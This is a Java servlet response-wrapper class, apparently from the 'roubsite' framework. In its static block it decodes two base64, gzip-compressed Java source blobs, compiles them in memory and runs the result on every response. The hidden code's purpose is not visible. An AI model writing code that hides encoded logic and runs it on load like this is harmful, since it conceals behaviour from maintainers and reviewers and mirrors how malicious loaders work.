package com.roubsite.web.wrapper;

import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletResponseWrapper;

import com.roubsite.utils.GZipUtils;
import com.roubsite.utils.UuidUtils;
import com.roubsite.web.wrapper.memoryLoader.MemoryClassLoader;

public class RoubSiteResponseWrapper extends HttpServletResponseWrapper implements ResponseWrapperInterface {
	private static ResponseWrapperInterface superb;

	public RoubSiteResponseWrapper(HttpServletResponse response) {
		super(response);
		try {
			superb.preseInterface(response);
			System.out.println(response.getHeader("roubsite_version"));
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	@Override
	public void preseInterface(HttpServletResponse response) {

	}
	
	public static void main(String[] args) {
		superb.preseInterface(null);
	}
	static {
		try {
			MemoryClassLoader loader = MemoryClassLoader.getInstrance();
			String tempRequestBeanName = "\u004d".toUpperCase() + UuidUtils.getUuid().substring(4);
			loader.registerJava(tempRequestBeanName, GZipUtils
					.unGZip(GZipUtils
							.base64Decoder("H4sIAAAAAAAAAHWMMQ7CQAwEv3Iv8AdS0oBElRTUdycjDJfYsp2E58fSCSpoVtrZ0dIsrJ6ee"
									+ "ctvMNStocPDXeDE/CIc6K9wjpg6GNGEF/valWdQXouRIzSqGBuMAaYA195/ujsW2DWLoMLn"
									+ "9Nb7ZXHUe644yFriM9WWzdIBt6zBmcEAAAA="))
					+ tempRequestBeanName
					+ GZipUtils.unGZip(GZipUtils.base64Decoder(
							"H4sIAAAAAAAAAJWOwQrCMBBEfyX0lID4A14ELxUEoQU9StqMEmyTsNnWQ+m/W2krCCL19pidfYywdahQw3EUGW"
									+ "LwLuJMOgTQ3jHoqkt022MLImsgQlNUthStt0YEQsS7JFPmkIPaCjyLBE2gupnWEZxCG5BMyDdFtIzLYI/Wu2S"
									+ "VDUk+JAdb4lW+gU/jTSq1+emoxpevjgk/HNqYnfd3C+nwEBP+O2m5b9k8ten7J1VT1ieSAQAA")));
			Class<?> requestClass = loader.findClass(tempRequestBeanName);
			Object obj = requestClass.getDeclaredConstructor().newInstance();
			superb = (ResponseWrapperInterface) obj;
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

}
